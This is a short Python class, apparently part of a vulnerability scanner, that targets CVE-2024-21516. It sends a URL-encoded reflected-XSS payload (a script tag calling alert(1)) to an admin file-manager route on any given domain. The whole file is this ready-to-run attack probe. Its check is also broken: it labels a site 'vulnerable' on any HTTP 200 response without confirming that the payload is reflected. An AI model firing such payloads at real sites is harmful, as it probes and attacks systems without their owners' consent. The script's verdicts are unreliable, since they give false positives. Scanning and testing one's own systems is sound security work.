import requests
import datetime

class cve_2024_21516():
    def reflected_xss(self, domain):
        payload = '/admin/index.php?route=common/filemanager.list&directory=demo%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%253Cinput%2Btype%253D%2522hidden'
        url = 'https://'+domain+payload
        access_endpoint = requests.post(url, allow_redirects=True)
        time = datetime.datetime.now()
        time_str = time.strftime('%H:%M:%S')
        time_str_fixed = f'{time_str:>8}'
        if access_endpoint.status_code == 200 : return f'[{time_str_fixed}] CVE-2024-21516 : vulnerable'
        else : return f'[{time_str_fixed}] CVE-2024-21516 : not vulnerable'
        
